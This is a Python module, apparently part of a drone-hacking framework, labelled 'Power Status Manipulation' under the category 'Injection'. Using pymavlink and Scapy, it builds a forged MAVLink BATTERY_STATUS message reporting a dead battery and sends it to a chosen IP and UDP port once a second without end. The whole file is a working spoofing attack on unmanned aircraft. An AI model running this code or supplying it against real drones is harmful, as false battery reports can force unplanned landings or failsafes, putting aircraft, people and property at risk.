from core.base import BaseModule
from pymavlink import mavutil
from scapy.all import *
import time

class PowerStatusManipulationModule(BaseModule):
    def __init__(self):
        super().__init__(
            name="Power Status Manipulation", 
            description="Spoofs battery status to indicate a dead battery", 
            category="Injection"
        )
        # The options dictionary now directly uses dictionaries for each option
        self.options = {
            "target": {"value": "", "required": True, "description": "The target IP address"},
            "port": {"value": "14550", "required": True, "description": "The target port (default is 14550)"}
        }

    def create_battery_status(self):
        """
        Create a MAVLink BATTERY_STATUS message indicating a dead battery.
        """
        mav = mavutil.mavlink.MAVLink(None)
        mav.srcSystem = 1
        mav.srcComponent = 1

        battery_status = mav.battery_status_encode(
            id=0,  # Battery ID
            battery_function=mavutil.mavlink.MAV_BATTERY_FUNCTION_ALL,  # Function of the battery
            type=mavutil.mavlink.MAV_BATTERY_TYPE_LIPO,  # Type of battery
            temperature=300,  # Temperature in celsius * 10
            voltages=[3000, 3000, 3000, 0, 0, 0, 0, 0, 0, 0, 0],  # Very low battery voltage of cells (in millivolts)
            current_battery=-1,  # Battery current in 10*milliamperes (-1 for not measured)
            current_consumed=5000,  # Consumed current in mAh (high value indicating usage)
            energy_consumed=10000,  # Consumed energy in 1/100th Joules (high value indicating usage)
            battery_remaining=0  # Remaining battery energy (0% - indicating dead battery)
        )

        return battery_status.pack(mav)

    def send_mavlink_packet(self, packet_data, target_ip, target_port):
        """
        Send a MAVLink packet using Scapy.
        """
        packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=packet_data)
        send(packet)

    def run(self):
        target_ip = self.options["target"]["value"].strip()
        target_port = self.options["port"]["value"].strip()

        try:
            target_port = int(target_port)
        except ValueError:
            print("Invalid port value.")
            return

        while True:
            battery_status_packet = self.create_battery_status()
            self.send_mavlink_packet(battery_status_packet, target_ip, target_port)
            print(f"Sent battery status packet to {target_ip}:{target_port}")
            time.sleep(1)  # Add delay to avoid overwhelming the network
